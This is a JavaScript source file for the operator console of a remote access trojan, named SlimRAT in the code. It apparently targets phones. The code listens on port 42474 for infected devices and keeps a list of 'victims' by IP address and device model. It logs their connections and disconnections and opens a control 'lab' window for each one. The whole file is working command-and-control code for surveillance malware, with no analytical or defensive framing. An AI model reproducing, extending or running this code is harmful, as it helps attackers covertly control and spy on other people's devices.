var app = angular.module('MainApp', ['infinite-scroll']);
const { ipcRenderer } = require('electron');
const { remote } = require('electron');
var homeDir = require('homedir');
var fs = require('fs-extra');
var path = require('path');
var victimsList = remote.require('./main');

var dataPath = path.join(homeDir(), 'Desktop');
var downloadsPath = path.join(dataPath, 'SlimRAT');
var viclist = {};

app.controller('MainCtrl', function($scope) {
  $mainCtrl = $scope;
  $mainCtrl.victims = viclist;
  $mainCtrl.isVictimSelected = true;
  $mainCtrl.logs = [];

  var log = document.getElementById('log');
  const window = remote.getCurrentWindow();

  $mainCtrl.close = function() {
    window.close();
  };

  $mainCtrl.minimize = function() {
    window.minimize();
  };

  $mainCtrl.Listen = function(port) {
    if (!port) {
      port = 42474;
    }

    ipcRenderer.send('SocketIO:Listen', port);
    $mainCtrl.Log('Listening on port => ' + port, 1);
  };

  ipcRenderer.on('SocketIO:NewVictim', function(event, index) {
    viclist[index] = victimsList.getVictim(index);
    $mainCtrl.Log('New victim from ' + viclist[index].ip);
    $mainCtrl.$apply();
  });

  ipcRenderer.on('SocketIO:Listen', function(event, error) {
    $mainCtrl.Log(error, 0);
    $mainCtrl.isListen = false;
    $mainCtrl.$apply();
  });

  ipcRenderer.on('SocketIO:RemoveVictim', function(event, index) {
    $mainCtrl.Log('Victim disconnected ' + viclist[index].ip);
    delete viclist[index];
    $mainCtrl.$apply();
  });

  $mainCtrl.openLab = function(index, manf, model, release) {
    localStorage.setItem('victim_id', index);
    localStorage.setItem('victim_manf', manf);
    localStorage.setItem('victim_model', model);
    localStorage.setItem('victim_release', release);
    ipcRenderer.send('openLabWindow', 'lab.html', index);
  };

  $mainCtrl.Log = function(msg, status) {
    var fontColor = 'white';

    if (status == 1) {
      fontColor = 'green';
    } else if (status == 0) {
      fontColor = 'red';
    }

    $mainCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
    log.scrollTop = log.scrollHeight;

    if (!$mainCtrl.$$phase) {
      $mainCtrl.$apply();
    }
  };
});
